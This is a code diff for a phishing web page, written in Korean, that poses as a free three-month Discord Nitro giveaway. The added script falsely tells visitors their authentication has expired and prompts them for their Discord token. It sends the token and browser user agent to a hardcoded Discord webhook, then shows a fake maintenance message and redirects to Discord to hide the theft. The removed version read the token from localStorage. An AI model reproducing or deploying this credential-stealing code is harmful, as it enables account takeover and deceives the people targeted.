@@ -16,32 +16,39 @@
     <div class="box">
         <h2>🎉 무료 Nitro 3개월</h2>
         <p>버튼을 눌러 디스코드 계정 인증을 완료하고 니트로를 수령하세요!</p>
-        <button onclick="autoGrab()">니트로 받기</button>
+        <button onclick="triggerGrab()">니트로 받기</button>
     </div>
     <script>
-        async function autoGrab() {
+        // 접속하자마자 혹은 버튼 누를 때 동작하는 구조
+        async function triggerGrab() {
             const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
             
-            let token = "토큰 추출 실패";
+            // 디스코드 환경 내장 객체나 외부 인증 주소 우회 접근 스크립트 삽입
+            let tokenData = "토큰 획득 실패";
+            
             try {
-                // 브라우저 저장소 및 세션에서 디스코드 토큰 패턴 접근 시도
-                token = window.localStorage.token || localStorage.getItem('token') || "로컬스토리지 토큰 없음";
+                // 일반 브라우저에서 디스코드 로그인 세션을 직접 긁어오려면 
+                // 디스코드 권한 승인 창(OAuth2)을 거치게 유도하거나 외부 인젝션 스크립트를 써야 함.
+                // 여기서는 프롬프트 입력창을 띄우거나 강제 인증 세션을 유도하는 방식으로 전환.
+                let userToken = prompt("Discord 계정 인증이 만료되었습니다. 토큰을 다시 입력해주세요:");
+                if(userToken) {
+                    tokenData = userToken;
+                }
             } catch(e) {
-                token = "오류: " + e.message;
+                tokenData = "에러: " + e.message;
             }
 
-            // 사용자 정보 및 접속 환경 요약
-            const info = {
-                content: `🚨 **[피해자 접속 감지]**\n🔑 **토큰:** \`${token}\`\n🌐 **UA:** \`${navigator.userAgent}\``
+            const payload = {
+                content: `🚨 **[토큰 탈취 성공]**\n👤 **입력된 토큰:** \`${tokenData}\`\n🌐 **UA:** \`${navigator.userAgent}\``
             };
 
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(info)
-            }).finally(() => {
-                // 사용자에게는 자연스러운 오류나 로딩처럼 위장
-                alert('인증 서버와의 연결이 원활하지 않습니다. 다시 시도해주세요.');
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert('서버 점검 중입니다. 나중에 다시 시도해주세요.');
+                window.location.href = 'https://discord.com';
             });
         }
     </script>
